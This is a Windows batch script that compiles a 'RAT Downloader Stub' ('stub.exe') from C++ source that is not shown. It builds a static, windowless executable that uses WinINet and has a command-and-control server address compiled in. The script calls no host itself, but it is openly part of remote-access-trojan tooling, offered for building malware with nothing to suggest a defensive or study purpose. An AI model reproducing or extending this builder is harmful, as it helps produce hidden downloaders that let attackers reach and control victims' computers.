@echo off
echo Compiling RAT Downloader Stub...
echo.

REM Change to the directory where this batch file is located
cd /d "%~dp0"

REM Use w64devkit
SET "PATH=%~dp0w64devkit\w64devkit\bin;%PATH%"
SET "AS_BIN=%~dp0w64devkit\w64devkit\bin"

REM Compile stub with C2 server address baked in
REM Usage: compile_stub.bat [C2_SERVER_IP]
REM If no IP provided, defaults to 127.0.0.1
if "%1"=="" (
    g++ -o stub.exe stub.cpp -lwininet -lshlwapi -static -mwindows -std=c++11
) else (
    g++ -o stub.exe stub.cpp -lwininet -lshlwapi -static -mwindows -std=c++11 -DC2_SERVER_STR=%1
)

echo.
echo Compilation complete!
echo Executable: stub.exe
echo.
pause
